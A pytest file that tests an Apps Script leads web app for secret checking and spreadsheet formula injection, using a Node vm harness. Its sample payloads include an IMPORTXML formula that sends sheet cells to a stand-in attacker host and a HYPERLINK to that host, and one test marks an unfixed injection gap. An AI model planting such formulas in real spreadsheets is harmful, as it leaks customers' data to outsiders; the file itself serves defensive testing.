"""Leads web app (apps-script/Code.gs): auth and formula injection into the owner's sheet (A05, A07).

Code.gs runs in a node vm with in-memory stand-ins for SpreadsheetApp, PropertiesService,
LockService, Utilities and ContentService. Every value the script hands to appendRow/setValue is
recorded, which is what Sheets would evaluate.

How the defense could fail (written before the tests):
1. The secret check runs after a write, or a missing Script Property lets an empty secret pass.
2. safeCell is applied to message/username but not to every caller-supplied column
   (channel, contact_id), so "=IMPORTXML(...)" lands as a live formula that can send other rows
   (customer usernames, messages) to an attacker URL when the owner opens the sheet.
3. The update path (same contact, same day) skips safeCell.
Note: who can reach this: anyone holding LEADS_SECRET, or n8n forwarding a channel/contact_id
taken from a request that knows ASSISTANT_SECRET. Sheets evaluation itself is not exercised here.
"""

import pytest
import json
import subprocess
from pathlib import Path

CODE_GS = Path(__file__).resolve().parents[3] / "apps-script" / "Code.gs"
SECRET = "leads-secret-for-test"
FORMULA = '=IMPORTXML("https://attacker.test/?d="&E2,"//a")'

HARNESS = r"""
const vm = require('vm'), fs = require('fs');
const [codePath, secret] = process.argv.slice(1, 3);
const posts = JSON.parse(fs.readFileSync(0, 'utf8'));
const writes = [];
const rows = [];
function range(r, c) {
  const self = {
    setNumberFormat() { return self; },
    setValue(v) { writes.push({ row: r, col: c, value: v }); if (rows[r - 1]) rows[r - 1][c - 1] = v; return self; },
    getValues() { return rows.slice(r - 1).map((x) => x.slice()); },
  };
  return self;
}
const sheet = {
  getLastRow: () => rows.length,
  getMaxRows: () => 1000,
  appendRow(values) { writes.push({ appendRow: values.map(String) }); rows.push(values.slice()); },
  setFrozenRows() {},
  getRange: (r, c, nr) => (nr && nr > 1 && r > 1 ? { getValues: () => rows.slice(r - 1, r - 1 + nr).map((x) => x.slice()) } : range(r, c)),
};
const ctx = {
  SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSheetByName: () => sheet, insertSheet: () => sheet }) },
  PropertiesService: { getScriptProperties: () => ({ getProperty: () => secret || null }) },
  LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
  Utilities: { formatDate: (d) => d.toISOString().slice(0, 10) },
  ContentService: { createTextOutput: (t) => ({ setMimeType: () => t }), MimeType: { JSON: 'json' } },
};
vm.createContext(ctx);
vm.runInContext(fs.readFileSync(codePath, 'utf8'), ctx);
const responses = posts.map((p) => JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify(p) } })));
process.stdout.write(JSON.stringify({ responses, writes }));
"""


def post_all(posts, script_secret=SECRET):
    out = subprocess.run(
        ["node", "-e", HARNESS, str(CODE_GS), script_secret], input=json.dumps(posts),
        capture_output=True, text=True, encoding="utf-8", check=True, timeout=30,
    )
    return json.loads(out.stdout)


def lead(**overrides):
    return {"secret": SECRET, "channel": "instagram", "contact_id": "1789", "username": "ana",
            "message": "quiero comprar", "timestamp": "2026-11-10T12:00:00Z", **overrides}


def _written_cells(writes):
    cells = []
    for w in writes:
        cells.extend(w.get("appendRow", []))
        if "value" in w and isinstance(w["value"], str):
            cells.append(w["value"])
    return cells


def test_wrong_or_missing_secret_writes_nothing():
    res = post_all([lead(secret="nope"), lead(secret=""), {k: v for k, v in lead().items() if k != "secret"}])
    assert [r["error"] for r in res["responses"]] == ["unauthorized"] * 3
    assert res["writes"] == []
    unset = post_all([lead(secret="")], script_secret="")
    assert unset["responses"] == [{"ok": False, "error": "unauthorized"}]
    assert unset["writes"] == []


def test_message_and_username_formulas_are_neutralized_on_create_and_update():
    res = post_all([
        lead(message=FORMULA, username="@evil"),
        lead(message="+" + FORMULA[1:]),          # same contact, same day -> update path
        lead(contact_id="1790", message="-1+1", username="=1+1"),
    ])
    assert [r.get("action") for r in res["responses"]] == ["created", "updated", "created"]
    header_free = [c for c in _written_cells(res["writes"]) if c != ""]
    live = [c for c in header_free if c[:1] in "=+-@" and c not in ("created_at",)]
    assert live == [], f"live formulas written: {live}"


@pytest.mark.open_finding  # SEC-08, not fixed yet
def test_every_caller_supplied_column_is_neutralized():
    res = post_all([lead(channel=FORMULA), lead(contact_id='=HYPERLINK("https://attacker.test")')])
    assert [r.get("ok") for r in res["responses"]] == [True, True]
    live = [c for c in _written_cells(res["writes"]) if c[:1] in "=+-@"]
    assert live == [], f"live formulas written: {live}"
